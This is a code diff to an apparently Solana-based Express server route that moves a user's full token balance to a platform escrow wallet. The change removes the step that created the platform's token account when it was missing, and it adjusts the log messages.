@@ -2199,7 +2199,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         console.log(`   - Will TRANSFER to platform wallet (escrow)`);
         
         if (exactRawAmount !== '0') {
-          // Get or create associated token account for platform wallet
+          // Get platform wallet's token account (already exists)
           const platformTokenAccount = await getAssociatedTokenAddress(
             mintPublicKey,
             platformWalletPublicKey,
@@ -2207,27 +2207,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
             token.programId
           );
           
-          // Check if platform token account exists
-          const platformAccountInfo = await connection.getAccountInfo(platformTokenAccount);
-          
-          console.log(`🔍 Platform token account: ${platformTokenAccount.toBase58()}`);
-          console.log(`🔍 User token account: ${token.account.toBase58()}`);
-          console.log(`🔍 Platform account exists: ${!!platformAccountInfo}`);
-          
-          // Create platform account if it doesn't exist
-          if (!platformAccountInfo) {
-            const createAccountInstruction = createAssociatedTokenAccountInstruction(
-              ownerPublicKey,           // payer (user pays for account creation)
-              platformTokenAccount,      // account to create
-              platformWalletPublicKey,   // owner (platform wallet)
-              mintPublicKey,             // mint
-              token.programId            // program ID
-            );
-            transaction.add(createAccountInstruction);
-            console.log(`✅ Added create ATA instruction for platform wallet`);
-          } else {
-            console.log(`ℹ️ Platform token account already exists, skipping creation`);
-          }
+          console.log(`🔍 Platform destination: ${platformTokenAccount.toBase58()}`);
+          console.log(`🔍 User source: ${token.account.toBase58()}`);
           
           // TRANSFER (NOT BURN) ALL tokens to platform wallet using EXACT on-chain balance
           const rawBalance = BigInt(exactRawAmount);
@@ -2243,7 +2224,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
             token.programId          // program ID
           );
           transaction.add(transferInstruction);
-          console.log(`✅ Added TRANSFER instruction (NOT BURN) - ${rawBalance.toString()} units → platform escrow`);
+          console.log(`✅ Added TRANSFER instruction - ${rawBalance.toString()} units → ${platformTokenAccount.toBase58()}`);
           
           // Step 2: Close the now-empty account to reclaim SOL immediately  
           const closeInstruction = createCloseAccountInstruction(
